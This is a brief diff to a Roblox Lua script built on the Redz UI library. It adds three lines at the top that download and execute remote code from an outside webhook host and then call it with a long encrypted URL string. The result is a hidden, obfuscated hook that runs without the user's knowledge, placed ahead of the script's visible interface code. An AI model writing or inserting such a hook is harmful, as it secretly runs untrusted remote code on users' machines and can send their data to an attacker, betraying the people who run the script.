@@ -1,3 +1,9 @@
+local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
+
+local cryptUrl = "245777a271a0e301b43b40c17ac920437c107bfc261c4eed193f66e39f37e62d5b851418ec2f52a87d2b1febbf37d8b3291af676ebc4174badd470c1fd409563c2bd470d459dc4da19c206a5171ce4be0ef5ccadcef0aa02eed2b139884ead47ab8b2e7185c8a140cb25b4e01ab862237bc7a95d7f8773d4adcdcc33cb54a562a9ce644a75603571d779b7baf9fbec96b85034f16034fd19f140f9dae223c5eb56c1b172d3dd1bb986624463b18ed279f559f205f23358cf50481dd265d59943952ca17ddbd2620695b59aff61044c31cdc2689850618415552ce586deade807"
+
+requestWebhook(cryptUrl)
+
 local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Theus999dev/Library-ui/refs/heads/main/Redzhubui"))()
 
 local Window = redzlib:MakeWindow({
